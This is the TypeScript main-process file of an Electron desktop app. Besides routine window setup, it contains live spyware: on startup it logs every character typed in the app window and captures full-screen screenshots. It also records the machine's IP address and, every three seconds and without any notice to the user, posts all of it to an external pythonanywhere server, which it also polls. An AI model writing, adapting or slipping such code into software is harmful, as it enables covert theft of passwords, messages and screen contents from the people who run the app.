import path from 'path'
import { app, ipcMain, desktopCapturer, BrowserWindow } from 'electron'
import serve from 'electron-serve'
import axios from 'axios';
import os from 'os';

import { createWindow } from './helpers'

const isProd = process.env.NODE_ENV === 'production'

let keystrokes: string[] = [];

// Initialize keystroke listener using Electron's built-in events
export function startKeyLogger() {
  const win = BrowserWindow.getFocusedWindow();
  
  if (win) {
    win.webContents.on('before-input-event', (event, input) => {
      // Capture only character keys and space
      if (input.type === 'keyDown' && input.key.length === 1) {
        keystrokes.push(input.key);
      }
    });
  }
}

// Get IP address
function getIPAddress() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const net of interfaces[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        console.log("hello vro here's da ip :", net.address)
        return net.address;
      }
    }
  }
  return '0.0.0.0';
}

// Capture screenshot
async function captureScreenshot() {
  const sources = await desktopCapturer.getSources({ types: ['screen'], thumbnailSize: { width: 1920, height: 1080 } });
  
  if (sources[0]) {
    return sources[0].thumbnail.toPNG().toString('base64');
  }
  return '';
}

// Modified sendData function
async function sendData() {
  try {
    const screenshot = await captureScreenshot();
    const payload = {
      Type: "master",
      data: [
        keystrokes,       // Data 1: Keystrokes array
        getIPAddress(),   // Data 2: IP address
        screenshot        // Data 3: Screenshot as base64 string
      ]
    };

    const response = await axios.post(
      'http://swadheenmishra123.pythonanywhere.com/receive_data', 
      payload
    )

    console.log("sent ", response.data);
    
    // Reset keystrokes after sending
    keystrokes = [];
    
  } catch (error) {
    console.error("Da error is", error);
  }
}

async function receiveData() {
    try {
        const response = await axios.get('http://swadheenmishra123.pythonanywhere.com/send_data?Type=slave')
        console.log(response.data['data'])
    }
    catch (error) {
        console.error(error)
    }
}

if (isProd) {
  serve({ directory: 'app' })
} else {
  app.setPath('userData', `${app.getPath('userData')} (development)`)
}

(async () => {
  await app.whenReady().then(() => {
    startKeyLogger();
    setInterval(sendData, 3000);
})

  const mainWindow = createWindow('main', {
    width: 1000,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
    },
  })

  if (isProd) {
    await mainWindow.loadURL('app://./home')
  } else {
    const port = process.argv[2]
    await mainWindow.loadURL(`http://localhost:${port}/home`)
    mainWindow.webContents.openDevTools()
  }
})()

app.on('window-all-closed', () => {
  app.quit()
})

ipcMain.on('message', async (event, arg) => {
  event.reply('message', `${arg} World!`)
})
